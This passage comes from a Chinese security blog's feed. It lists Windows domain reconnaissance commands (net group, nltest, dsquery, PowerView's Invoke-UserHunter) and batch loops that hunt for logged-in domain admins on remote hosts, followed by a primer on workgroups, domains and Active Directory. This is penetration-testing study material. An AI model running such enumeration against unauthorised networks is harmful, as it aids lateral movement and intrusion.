#FFCB6B">telnet</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #C3E88D">addres</span><span style="color: #BABED8">s</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #C3E88D">por</span><span style="color: #BABED8">t</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div></li><li><p><strong>metasploit</strong> 的端口扫描模块<br><a href="https://blog.csdn.net/weixin_44255856/article/details/97900038">渗透之metasploit技术-端口扫描，漏洞利用_search portscan-CSDN博客</a></p></li><li><p><strong>Nmap</strong></p></li></ul><h4 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h4><ul><li><code>net group &quot;Domain Controllers&quot; /domain</code></li><li><code>nltest /DCLIST:&lt;域名&gt;</code></li><li><code>nslookup -type=SRV _LDAP._tcp</code></li><li><code>net time /domain</code></li><li><code>netdom query pdc</code></li></ul><h4 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h4><ul><li><p><strong>查询所有域用户列表</strong>：</p><ul><li><p><code>net user /domain</code></p></li><li><p><code>wmic useraccount get /all</code></p></li><li><p><code>dsquery user</code></p></li><li><p><code>net localgroup administrators /domain</code></p></li></ul></li><li><p><strong>查询域管理员用户组</strong>:</p><ul><li><code>net group &quot;Enterprise Admains&quot; /domain</code></li></ul></li><li><p><strong>定位域管理员</strong>:</p><ul><li><p><strong>PsLoggedon</strong> - <a href="https://blog.csdn.net/qq_44159028/article/details/115439633">定位域管理员_psloggedon-CSDN博客</a><br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20105737.png?raw=true"></p></li><li><p><strong>AdFind</strong>- <a href="https://blog.csdn.net/weixin_43571641/article/details/124263803">域内信息查询工具AdFind_adfind download-CSDN博客</a></p></li><li><p><strong>PVEFindADUser</strong> - <a href="https://blog.csdn.net/qq_44159028/article/details/115439633">定位域管理员 PVEFindADUser-CSDN博客</a><br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20110437.png?raw=true"></p></li></ul></li><li><p><strong>查找域管理进程</strong>:</p><ul><li><p>本机检查：</p><ul><li><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">net</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">group</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">Domain Admins</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">/domain</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//获取域管理员列表</span></span></code></pre></div></li><li><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">tasklist</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/v</span><span style="color: #BABED8">       </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">列出本机所有进程及进程用户</span></span></code></pre></div><p><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20110732.png?raw=true"></p></li></ul></li></ul></li><li><p><strong>查询域控制器的域用户会话</strong>：</p><ul><li><p>收集域控制器的列表</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">net</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">group</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">Domain Controllers</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">/domain</span></span></code></pre></div></li><li><p>收集域管理员列表</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">net</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">group</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">Domain Admins</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">/domain</span></span></code></pre></div></li><li><p><strong>Netsess</strong><br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20111100.png?raw=true"></p></li></ul></li><li><p><strong>扫描远程系统上运行的任务：</strong></p><ul><li><p>前提是目标使用了本地域管理员共享账户</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">FOR</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/F</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%i</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">in</span><span style="color: #BABED8"> (ips.txt) DO @echo </span><span style="color: #89DDFF">[</span><span style="color: #BABED8">+</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> %i </span><span style="color: #89DDFF">&amp;&amp;</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">@tasklist/V</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/S</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%i</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/U</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">user</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/P</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">password</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">2&gt;</span><span style="color: #C3E88D">NUL</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">output.txt</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&amp;&amp;</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">FOR</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/F</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%n</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">in</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">names.txt</span><span style="color: #89DDFF">)</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">DO</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">@type</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">output.txt</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">|</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">findstr</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%n</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">NUL</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&amp;&amp;</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">echo</span><span style="color: #BABED8"> [!] %nwas found running a process on %i &amp;&amp; pause</span></span></code></pre></div></li></ul></li><li><p><strong>扫描远程系统上NetBIOS信息</strong>：</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF; font-style: italic">for</span><span style="color: #BABED8"> /F %i </span><span style="color: #89DDFF; font-style: italic">in</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">ips.txt</span><span style="color: #89DDFF">)</span><span style="color: #BABED8"> </span><span style="color: #89DDFF; font-style: italic">do</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">@echo</span><span style="color: #BABED8"> [+] Checking %i </span><span style="color: #89DDFF">&amp;&amp;</span><span style="color: #FFCB6B">nbtstat</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-A</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%i</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">2&gt;</span><span style="color: #C3E88D">NUL</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #C3E88D">nbsessions.txt</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&amp;&amp;</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">FOR</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/F</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%n</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">in</span><span style="color: #BABED8"> (admins.txt)DO @type nbsessions.txt </span><span style="color: #89DDFF">|</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">findstr</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/I</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">%n</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">NUL</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&amp;&amp;</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">echo</span><span style="color: #BABED8"> [!] %n wasfound logged into %i</span></span></code></pre></div></li></ul><h4 id="利用PowerShell收集域内信息"><a href="#利用PowerShell收集域内信息" class="headerlink" title="利用PowerShell收集域内信息"></a>利用PowerShell收集域内信息</h4><h5 id="命令汇总"><a href="#命令汇总" class="headerlink" title="命令汇总"></a>命令汇总</h5><ul><li><p>域信息收集</p><div class="language-powershell"><button title="Copy code" class="copy"></button><span class="lang">powershell</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">net time </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain                            </span><span style="color: #676E95; font-style: italic">#查看时间服务器</span></span><span class="line"><span style="color: #BABED8">net config workstation                      </span><span style="color: #676E95; font-style: italic">#查询当前登录域及登录用户信息</span></span><span class="line"><span style="color: #BABED8">net user </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain                            </span><span style="color: #676E95; font-style: italic">#查询域内用户</span></span><span class="line"><span style="color: #BABED8">wmic useraccount get </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">all                   </span><span style="color: #676E95; font-style: italic">#查询域内用户的详细信息</span></span><span class="line"><span style="color: #BABED8">net user xie </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain                        </span><span style="color: #676E95; font-style: italic">#查看指定域用户xie的详细信息</span></span><span class="line"><span style="color: #BABED8">net view </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain                            </span><span style="color: #676E95; font-style: italic">#查看有几个域</span></span><span class="line"><span style="color: #BABED8">net view </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain:xxx                        </span><span style="color: #676E95; font-style: italic">#查看域内的主机</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain                           </span><span style="color: #676E95; font-style: italic">#查看域里面的组</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">domain users</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8">  </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain           </span><span style="color: #676E95; font-style: italic">#查看域用户</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">domain controllers</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain      </span><span style="color: #676E95; font-style: italic">#查看域控制器</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">domain computers</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain        </span><span style="color: #676E95; font-style: italic">#查看域内所有的主机</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">domain admins</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8">  </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain          </span><span style="color: #676E95; font-style: italic">#查看域管理员,该组内的成员对域控拥有完全控制权</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">enterprise admins</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain       </span><span style="color: #676E95; font-style: italic">#查看企业管理组,该组内的成员对域控拥有完全控制权</span></span><span class="line"><span style="color: #BABED8">net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">domain guest</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8">  </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain           </span><span style="color: #676E95; font-style: italic">#查看域访客组,权限较低</span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #BABED8">nltest  </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain_trusts                      </span><span style="color: #676E95; font-style: italic">#查看域信任信息</span></span><span class="line"><span style="color: #BABED8">net accounts </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain                        </span><span style="color: #676E95; font-style: italic">#查询域密码策略</span></span><span class="line"><span style="color: #BABED8">whoami </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">user                                </span><span style="color: #676E95; font-style: italic">#查看用户SID和域SID，如用户的SID是：S-1-5-21-2189311154-2766837956-1982445477-520 则域SID则是去掉最后的520：S-1-5-21-2189311154-2766837956-1982445477</span></span><span class="line"><span style="color: #BABED8"> </span></span><span class="line"><span style="color: #BABED8">以下命令只能在域控上查询</span></span><span class="line"><span style="color: #BABED8">dsquery user                                </span><span style="color: #676E95; font-style: italic">#查询目录中的用户</span></span><span class="line"><span style="color: #BABED8">dsquery computer                            </span><span style="color: #676E95; font-style: italic">#查询目录中的主机</span></span><span class="line"><span style="color: #BABED8">dsquery group                               </span><span style="color: #676E95; font-style: italic">#查询目录中的组.</span></span><span class="line"><span style="color: #BABED8">dsquery ou                                  </span><span style="color: #676E95; font-style: italic">#查询目录中的组织单元.</span></span><span class="line"><span style="color: #BABED8">dsquery site                                </span><span style="color: #676E95; font-style: italic">#查询目录中的站点</span></span><span class="line"><span style="color: #BABED8">dsquery server                              </span><span style="color: #676E95; font-style: italic">#查询域控</span></span><span class="line"><span style="color: #BABED8">dsquery contact                             </span><span style="color: #676E95; font-style: italic">#查询目录中的联系人</span></span><span class="line"><span style="color: #BABED8">dsquery subnet                              </span><span style="color: #676E95; font-style: italic">#查询目录中的子网</span></span><span class="line"><span style="color: #BABED8">dsquery quota                               </span><span style="color: #676E95; font-style: italic">#查询目录中的配额规定.</span></span><span class="line"><span style="color: #BABED8">dsquery partition                           </span><span style="color: #676E95; font-style: italic">#查询目录中的分区.</span></span><span class="line"><span style="color: #BABED8">dsquery </span><span style="color: #89DDFF">*</span><span style="color: #BABED8">                                   </span><span style="color: #676E95; font-style: italic">#用通用的LDAP查询来查找目录中的任何对 </span></span><span class="line"><span style="color: #BABED8">dsquery server –domain </span><span style="color: #82AAFF">xie.com</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">|</span><span style="color: #BABED8"> dsget server–dnsname –site     </span><span style="color: #676E95; font-style: italic">#搜索域内域控制器的DNS主机名和站点名</span></span><span class="line"><span style="color: #BABED8">dsquery computer domainroot –name </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">xp –limit </span><span style="color: #F78C6C">10</span><span style="color: #BABED8">      </span><span style="color: #676E95; font-style: italic">#搜索域内以-xp结尾的机器10台</span></span><span class="line"><span style="color: #BABED8">dsquery user domainroot –name admin </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">limit           </span><span style="color: #676E95; font-style: italic">#搜索域内以admin开头的用户10个</span></span></code></pre></div></li><li><p>查询域控的主机名</p><div class="language-powershell"><button title="Copy code" class="copy"></button><span class="lang">powershell</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">方法一：net group </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">domain controllers</span><span style="color: #89DDFF">&quot;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain       </span><span style="color: #676E95; font-style: italic">#这里查询结果后面会多一个 $ </span></span><span class="line"><span style="color: #BABED8">方法二：nltest </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">DCLIST:</span><span style="color: #82AAFF">xie.com</span></span><span class="line"><span style="color: #BABED8">方法三：net time </span><span style="color: #89DDFF">/</span><span style="color: #BABED8">domain </span></span><span class="line"><span style="color: #BABED8">方法四：nslookup </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">type</span><span style="color: #89DDFF">=</span><span style="color: #BABED8">srv _ldap._tcp</span></span><span class="line"><span style="color: #BABED8">方法五：查看DNS服务器的地址，一般DNS服务器的IP就是域控的地址</span></span><span class="line"><span style="color: #BABED8">方法六：netdom query pdc                             </span><span style="color: #676E95; font-style: italic">#该命令只能在域控上执行</span></span><span class="line"><span style="color: #BABED8">方法七：dsquery server                               </span><span style="color: #676E95; font-style: italic">#该命令只能在域控上执行</span></span></code></pre></div></li></ul><h5 id="利用PowerSploit"><a href="#利用PowerSploit" class="headerlink" title="利用PowerSploit"></a>利用PowerSploit</h5><ul><li><p>PowerShell 常用的执行权限共有四种</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">Restricted：默认设置，不允许执行任何脚本。</span></span><span class="line"><span style="color: #FFCB6B">Allsigned：只能运行经过证书验证的脚本。</span></span><span class="line"><span style="color: #FFCB6B">Unrestricted：权限最高，可以执行任意脚本。</span></span><span class="line"><span style="color: #FFCB6B">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。</span></span></code></pre></div><p>在 PowerShell 中输入“Get-ExecutionPolicy”，可以看到当前权限<br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20112615.png?raw=true"></p></li><li><p>使用<strong>PowerSploit</strong>的<strong>PowerView</strong>脚本</p><ul><li><p>导入脚本</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">Import-Module</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">.</span><span style="color: #BABED8">\P</span><span style="color: #C3E88D">owerView.ps1</span></span></code></pre></div></li><li><p>功能:</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"></span><span class="line"><span style="color: #FFCB6B">Get-NetDomain</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取当前用户所在的域名称。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetUser</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">返回所有用户的详细信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetDomainController</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取所有域控制器。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetComputer</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取所有域内机器的详细信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetOU</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取域中的</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">OU</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetGroup</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取所有域内组和组成员信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetFileServer</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">根据</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">SPN</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取当前域使用的文件服务器。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetShare</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取当前域内所有网络共享。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetSession</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取在指定服务器存在的会话信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetRDPSession</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取在指定服务器存在的远程连接信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetProcess</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取远程主机的进程信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-UserEvent</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取指定用户的日志信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-ADObject</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取活动目录的对象信息。</span></span><span class="line"><span style="color: #FFCB6B">Get-NetGPO</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取域所有组策略对象。</span></span><span class="line"><span style="color: #FFCB6B">Get-DomainPolicy</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">获取域默认或域控制器策略。</span></span><span class="line"><span style="color: #FFCB6B">Invoke-UserHunter</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">//</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">用于获取域用户登录计算机及该用户是否有本地管理权限。</span></span></code></pre></div></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h2&gt;&lt;h3 id=&quot;一-收集本机信息&quot;&gt;&lt;a href=&quot;#一-收集本机信息&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全-基本概念</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html</id>
    <published>2024-04-10T07:41:44.000Z</published>
    <updated>2024-04-11T13:22:59.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网基本概念"><a href="#内网基本概念" class="headerlink" title="内网基本概念"></a>内网基本概念</h2><h4 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h4><p>又称内网, 是指在某一区域内由多台计算机互联成的计算机组。</p><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p><strong>工作组（Work Group）就像一个可以自由进入和退出的社团</strong>，方便同组的计算机互相访问。没有集中管理作用，所有计算机都是<strong>对等的</strong>。</p><ul><li>在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</li><li>为了解决这一问题，早在Windows 9x&#x2F;NT&#x2F;2008就引用了“<strong>工作组</strong>”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。</li><li>你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。</li></ul><h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p><strong>域（Domain）是一个有安全边界的计算机集合</strong>。可以简单的把域理解成升级版的工作组，但有一个严格的集中管理控制机制。</p><ul><li>与工作组的“松散会员制”有所不同，“域”是一个相对严格的组织。“域”指的是服务器控制网络上的计算机能否加入的计算机组合。</li><li>实行严格的管理对网络安全是非常必要的。在对等网模式下，任何一台电脑只要接入网络，就可以访问共享资源。尽管对等网络上的共享文件可以加访问密码，但是非常容易被破解。在由Windows 9x构成的对等网中，<strong>数据是非常不安全的</strong>。</li><li><em>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的<strong>门卫</strong>一样，称为“<strong>域控制器（Domain Controller，简写为DC）</strong>”。“域控制器”中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，只能以对等网用户的方式访问Windows共享出来的资源，这样就一定程度上<strong>保护</strong>了网络上的资源</em></li><li>想把一台电脑加入域，仅仅使它和服务器在“网上邻居”能够相互看到是远远不够的，必须要由网络管理员进行把这台电脑加入域的相关操作。</li></ul><h4 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器-DC"></a>域控制器-DC</h4><p><strong>域控制器（Domain Controller，DC）相当于一个单位的门禁系统。DC中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</strong>。</p><p><strong>DC是整个域的通信枢纽。</strong></p><ul><li>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP&#x2F;IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题</li></ul><h4 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录-AD"></a>活动目录-AD</h4><p><strong>活动目录（Active Directory，AD）</strong>是指域环境中提供目录服务的组件</p><p>在目录中存储的信息可以是用户，组，计算机，共享资源，打印机，联系人等信息。目录服务可以帮助用户快速准确地从目录中找到需要的信息服务。</p><ul><li><p>活动目录主要提供的功能：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>账号集中管理：所有账号存储在服务器中，方便执行命令。</p><p>软件集中管理：统一推送软件，安装网络打印机。</p><p>增强安全性：统一部署杀毒软件，病毒扫描任务，集中管理计算机权限，统一制定用户密码策略等。</p></blockquote></li></ul><p>如果内网中的一台计算机上安装了AD，它就变成了DC（用于存储AD库的计算机）。</p><ul><li>DC的本质是一台计算机，AD的本质是提供目录服务的组件。</li></ul><h4 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h4><p>将一组安全等级相同的计算机划入同一个网段内， 在网络边界上通过防火墙来实现对其他安全域的NACL（网络访问控制策略）， 